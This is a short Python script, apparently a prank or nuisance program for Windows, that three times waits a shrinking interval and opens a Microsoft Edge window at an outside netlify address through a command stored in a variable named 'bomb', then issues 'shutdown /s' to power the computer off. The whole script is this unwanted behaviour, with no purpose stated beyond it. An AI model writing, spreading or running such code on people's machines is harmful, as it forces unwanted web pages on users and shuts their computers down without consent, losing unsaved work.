import os
import time
counter = 0
timer = 60

while counter < 3:
    counter += 1
    time.sleep(timer)
    bomb = 'microsoftedge /new-window https://thriving-paletas-d5335c.netlify.app/'
    os.system(bomb)
    timer -= 29
else:
    os.system("shutdown /s")
